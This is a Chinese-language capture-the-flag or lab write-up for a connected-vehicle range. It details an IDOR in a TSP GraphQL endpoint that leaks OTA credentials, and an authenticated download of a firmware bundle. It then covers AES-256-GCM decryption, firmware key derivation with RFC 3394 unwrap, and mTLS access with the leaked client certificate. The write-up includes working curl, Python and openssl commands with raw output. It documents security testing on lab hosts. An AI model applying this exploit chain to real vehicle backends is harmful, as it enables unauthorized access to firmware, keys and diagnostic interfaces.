# T02 前置链 — 从 TSP 越权到 OTA 工程包、AES-256-GCM 解密、SoC 绑定与 RFC 3394 密钥

> 环境：新靶场（2026-11-14 ~09:55 轮换后）
> TSP `10.225.139.2:8080` ｜ T-BOX `10.225.139.3:8080` + `:8443` ｜ CGW `10.225.139.4` / `10.226.193.2`
> 全部结论都有可复跑命令 + 原始输出（`03_EVIDENCE/tsp/019x`–`020x`）。

---

## 0. 一句话链图

```
DoIP 车辆识别(13400) ──VIN──► TSP /graphql vehicleDiagnostics(variables.vin)   ← 越权读取
        └─► firmwareCredential + packageKey + firmwareDownload
                    │
                    ├─ Basic diag:<firmwareCredential> ──► T-BOX :8080 /api/v1/ota/engineering-bundle  → ZIP
                    │
                    └─ ZIP: manifest.json + tbox-firmware.img(加密) + vcu-reference.bin + diagnostics/*.pem
                                   │
                                   ├─ AES-256-GCM(packageKey) ──► ARMv7-M Thumb-2 固件（sha256 与 manifest 一致）
                                   │            └─► SHA256("CV6-TBOX-KEK"‖SoC blob‖SHA256(flash[0:0x2000]))
                                   │                └─► RFC3394 unwrap(blob@0x08002040) ──► 32 B 密钥
                                   │
                                   └─ diagnostics/client.pem+key ──► T-BOX :8443 mTLS 握手通过
```

---

## 1. TSP `/graphql` 的真实用法（这是整条链的钥匙）

**匹配键是 `variables.vin`，query 文本只是装饰。** 不带 `variables.vin` 时服务端回落到
`{"data":{"vehicles":[{"label":"Guest demo vehicle",...}]}}`——这正是全队（包括我）此前
把 `/graphql` 误判为"硬编码桩"的原因。

```bash
curl -s -X POST http://10.225.139.2:8080/graphql -H 'Content-Type: application/json' \
  -d '{"query":"query { vehicleDiagnostics { vin } }","variables":{"vin":"CV622697F82A936A1"}}'
```

返回：

```json
{"data":{"vehicleDiagnostics":{
  "campaignId":"CAMP-243892C376D4CB2D5F826953",
  "diagnosticEndpoint":"https://tbox:8443",
  "firmwareCredential":"5e7f07b4a81153ecd5868cc02557f823",
  "firmwareDownload":"/api/v1/ota/engineering-bundle",
  "manifest":"ZIP; AES-256-GCM T-BOX image; mTLS diagnostic bundle; VCU reference image",
  "packageKey":"3ac02bb40567fa14062cc768e22fefac3dd972aee87a3bf2d01419f026d573d0",
  "tboxEndpoint":"http://tbox:8080",
  "vin":"CV622697F82A936A1"}}}
```

**越权边界（实测）**：只有真实注册 VIN `CV622697F82A936A1` 命中；
`CV6000000DEMO0001`、旧环境 VIN `CV6FF52FEE9EDDD86`、随机 VIN 一律回落到 demo 车。
⇒ **未认证访客可以读到真实车辆的 OTA 凭据**，这就是设计文档里的
`q1-ota-package: 利用云端 IDOR 读取测试车 OTA 包和历史 PCAP 附件`。
证据：`0190_graphql_vehicleDiagnostics_repro.txt`、`0193_recipe_verify.txt`

### 1.1 派发机制（已精确判定：不是 GraphQL 引擎）

`/graphql` 是**手写的两把钥匙的派发器**，完全不解析 GraphQL：

```go
if strings.Contains(req.Query, "vehicleDiagnostics") &&        // 大小写敏感的子串匹配
   req.Variables["vin"] == "<已注册的真实 VIN>" {              // 精确匹配
        return diagnosticsJSON
}
return guestDemoJSON                                            // 其它一切情况
```

判据（`0211_graphql_dispatch_mechanism.txt`）：

| 请求 | 结果 |
|---|---|
| `{"query":"vehicleDiagnostics","variables":{"vin":"CV622697F82A936A1"}}`（**根本不是合法 GraphQL**） | **派发成功** |
| `{"query":"xx vehicleDiagnostics yy","variables":{"vin":<真实 VIN>}}` | **派发成功** |
| `{"query":"VEHICLEDIAGNOSTICS",...}`（大写） | 回落 demo ⇒ 大小写敏感 |
| `{"query":"vehicleDiagnostics"}`（无 variables） | 回落 demo |
| `{"query":"vehicleDiagnostics","variables":{"vin":"CV6000000DEMO0001"}}` | 回落 demo ⇒ VIN 必须精确匹配已注册值 |
| `{"variables":{"vin":<真实 VIN>}}`（无 query） | 回落 demo |
| `__schema` introspection（带或不带 variables.vin） | 回落 demo ⇒ 无 schema |

⇒ 全服务**只有这一个 operation**；186 次根字段字典（vehicles/campaigns/audits/submissions/
firmware/ota/… × 3 种形态）+ 6 个 mutation 全部回落 demo（`0210_graphql_operation_fuzz.txt`）。
所以"再挖别的 operation"这条路已经穷尽。

---

## 2. 工程包下载

```bash
curl -u "diag:5e7f07b4a81153ecd5868cc02557f823" -o bundle.zip \
     http://10.225.139.3:8080/api/v1/ota/engineering-bundle
```

- `200`，`Content-Type: application/zip`，
  `Content-Disposition: attachment; filename="cv6-engineering-bundle.zip"`，`Transfer-Encoding: chunked`
- **用户名是 `diag`**（对照：`<cred>:<cred>`、`firmware:<cred>` 均 401）
- 每次下载 ZIP 都会重新生成（内嵌 nonce 与 PEM 序列号变化），大小 19623–19632 B 浮动；
  但**解密后的固件明文逐字节相同**
- 注意：这个端点只在 **T-BOX `.3:8080`** 上；TSP `.2:8080` 与
  `/api/v1/ota/engineering-bundle` 是 Go 默认 404

证据：`0192_bundle_download_repro.txt`、`0193_recipe_verify.txt`、`0204_tbox_8080_diag_api.txt`

ZIP 内容：

| 条目 | 大小 | 说明 |
|---|---|---|
| `vcu-reference.bin` | 1024 | magic `CV6VCU1\0`，高熵体；`0x300..0x331` 处有明文 `CALIBRATION: production steering and torque limits` |
| `diagnostics/ca.pem` | 595 | `CN = CV6 Fleet Diagnostics Root`（自签根） |
| `diagnostics/client.pem` | 611 | `CN = CV6 Engineering Diagnostic Client`，EKU = TLS Web Client Authentication，P-256 |
| `diagnostics/client-key.pem` | 241 | EC P-256 私钥 |
| `manifest.json` | 350 | 见下 |
| `tbox-firmware.img` | 16412 | `nonce(12)‖AES-256-GCM ct(16384)‖tag(16)` |

```json
{"cipher":"AES-256-GCM","format":"CV6-OTA-1","nonce":"15V0j0UJVCKc5BOt",
 "tboxAddress":"0x08000000","tboxArchitecture":"ARMv7-M Thumb-2 raw",
 "tboxSha256":"88b09d09edbf2951f7a111a51608e99a1bb28a27e653c169f4bf6ddd8c537229",
 "tboxSize":16384,"vcuReferenceSize":1024,"vcuRollback":2,"vcuUpdateAddress":"0x08040000"}
```

---

## 3. AES-256-GCM 解密（已验证）

```python
key   = bytes.fromhex(packageKey)          # 32 B
nonce = img[0:12]; ct = img[12:12+16384]; tag = img[12+16384:]
pt    = AESGCM(key).decrypt(nonce, ct+tag, None)
# sha256(pt) == manifest.tboxSha256  ✅
```

- 明文 16384 B，`sha256 = 88b09d09edbf2951f7a111a51608e99a1bb28a27e653c169f4bf6ddd8c537229` == manifest ✅
- **nonce 每次下载随机**（所以两次下载的 `tbox-firmware.img` 字节不同，但明文相同）
- 脚本 `04_SOLVE/tsp/fw_keyderive.py` 的输入段；证据 `0191`、`0194`

---

## 4. ARMv7-M 固件结构与 SoC 绑定 / RFC 3394 密钥

### 4.1 结构
- 向量表：SP `0x20010000`，**64 个向量全部指向 `0x08000755`**（Thumb），基址 `0x08000000`。
- 内建完整密码学实现：
  - SHA-256：H0..H7 @`0x08000778`（`6a09e667 bb67ae85 …`）、K[0..63] @`0x080009a0`（`0x428a2f98…` 小端存储）
  - AES：S-box @`0x080008a0`（`637c777bf26b6fc5…`）
  - **RFC 3394 默认 IV @`0x08000898` = `a6a6a6a6a6a6a6a6`**
- 字符串 `"CV6-TBOX-KEK"` @`0x08000aa0`（12 B）
- 数据 blob：`0x08002000`（16 B SoC 绑定值）、`0x08002020`（8 B）、
  `0x08002040`（**40 B 被包装的密钥**）；`0x08002068` 之后全 `0xFF`

### 4.2 密钥推导（`0x080006fc`，逐条指令核对）

```
H   = SHA256( flash[0x08000000 : +0x2000] )                 ; SoC 绑定测量（固件自度量）
KEK = SHA256( "CV6-TBOX-KEK" ‖ blob16@0x08002000 ‖ H )       ; 12 + 16 + 32 = 60 = 0x3c
K   = RFC3394_AES_unwrap( KEK, blob40@0x08002040 )           ; 40 B = IV(8) + 32 B 密钥
```

指令级证据：`bl 0x08000204(r0=0x08000000, r1=0x2000, r2=sp+4)`（SHA-256）→ 三次 memcpy
长度 `0xc/0x10/0x20` → `bl 0x08000204` 长度 `0x3c` → `bl 0x080002dc(in=KEK, wrapped=0x08002040,
len=0x28)`；而 `0x080002dc` 以 `cmp r2,#0x17` + `ands r2,#7`（RFC 3394 的 n≥2、长度≡0 mod 8）
开头并做 AES 轮密钥扩展。

### 4.3 实际算出的值（完整性自证通过）

```
H   = 138142b18d663291fc3febb15e004f57f76f10dee82f158a30b42ad7468ba085
KEK = 0fd6e171919fdc1a6afcee7f81a6599c67a136fc0f57e8f210fb2acf9c92b318
K   = 693d2ab06a2fe1a6e1ada23ac8bbb08ec3a8ffbbc90015ddeff28e721c9f693d   (32 B)
unwrap final IV = a6a6a6a6a6a6a6a6   ✅ == RFC 3394 IV
re-wrap(K) == blob40                ✅ 双向自证
```

脚本 `04_SOLVE/tsp/fw_keyderive.py`（自写 RFC 3394 wrap/unwrap）；证据 `0198_fw_keyderive.txt`；
密钥落 `01_TARGETS/tsp/engineering-bundle/tbox-image-key.bin`。

### 4.4 第二段绑定函数
`0x08000668` 是 **lowbias32** 混淆（`x^=x>>16; x*=0x7feb352d; x^=x>>15; x*=0x846ca68b; x^=x>>16`），
把调用方两个 8 B 缓冲与 `0x08002020` 的 8 B SoC blob 混成 8 B 输出（小端写回）。
这需要**真实 SoC 的 blob** 才能算，固件内是静态值。

### 4.5 未决
恢复出的 32 B 密钥 `693d2ab0…` 在固件里被写进 `sp+0x18` 后立即参与 lowbias32 混淆并 `wfi`。
用它去试 `vcu-reference.bin` 的 AES-CTR(zero/first16/magic8)/ECB/CBC/XOR **全部无结构**
（`0200_vcu_key_try.txt`）⇒ 它不是解 vcu-reference 的；消费方大概率在 T-BOX 诊断接口或 VCU 更新流程。

---

## 5. T-BOX 8443 mTLS：**墙已翻过去**

```
ca.pem     : CN = CV6 Fleet Diagnostics Root        (自签根)
client.pem : CN = CV6 Engineering Diagnostic Client (issuer 同上, EKU=TLS Web Client Authentication)
```

```
openssl s_client -connect 10.225.139.3:8443 \
  -cert client.pem -key client-key.pem -CAfile ca.pem -servername tbox -brief
→ CONNECTION ESTABLISHED
  Protocol version: TLSv1.3
  Ciphersuite: TLS_AES_128_GCM_SHA256
  Peer certificate: CN = tbox
  Verification: OK
```

**但墙后没有东西**：108 条路径 × GET/POST 全 `404 page not found`（19 B，Go 默认）；
`/graphql`、`/healthz`、`/api/v1/*` 也一样；非 HTTP 负载无响应；**ALPN 不协商**（非 h2/gRPC）。
`/internal/audit` 在 8443 也不是 JSON-404 而是 Go 默认 404（未注册）。
证据 `0201_tbox_mtls_with_bundle_cert.txt`、`0202_tbox_mtls_routes.txt`、`0203`、`0205`。

---

## 6. 其余端口面（新环境，2026-11-14 10:0x）

| 主机 | 路由 |
|---|---|
| `10.225.139.2:8080` (TSP) | `/healthz`、`/graphql`（POST，需 `variables.vin`）、`/internal/audit`（JSON-404 死桩） |
| `10.225.139.3:8080` (T-BOX) | `/healthz`、`GET /api/v1/ota/engineering-bundle`（Basic `diag:<cred>`）、`/internal/audit`（死桩） |
| `10.225.139.3:8443` (T-BOX mTLS) | **零路由**（mTLS 可通过） |
| `10.225.139.4:13400/13401`、`10.226.193.2:13400/13401` (CGW) | DoIP 可用，VIN `CV622697F82A936A1`，LA `0x1000`，EID `060000001000` |
| 两个 /24 × 23 端口全扫 | 无 MQTT / 无 DB / 无额外服务（`0186`） |

`/internal/audit` 用新拿到的 `diag:<cred>`、`Bearer <cred>`、`Bearer <packageKey>`、
`X-Firmware-Credential`、Cookie 全部仍恒 `{"error":"not found"}`（`0206`）。

---

## 7. 可重放脚本

| 脚本 | 作用 |
|---|---|
| `04_SOLVE/tsp/jwt_none_forge.py` | `alg=none` 全矩阵（这一步是**错的方向**，留作否证材料） |
| `04_SOLVE/tsp/fw_recon.py` | 固件向量表/字符串/literal pool/握手常数/熵段/flag 扫描 |
| `04_SOLVE/tsp/fw_keyderive.py` | **KEK 推导 + RFC 3394 unwrap + re-wrap 自证** |
| `04_SOLVE/tsp/tbox_mtls_probe.py` | 8443 mTLS 路由枚举 |
| `04_SOLVE/tsp/newrange_route_sweep.py` / `newrange_service_scan.py` | 新环境测绘 |
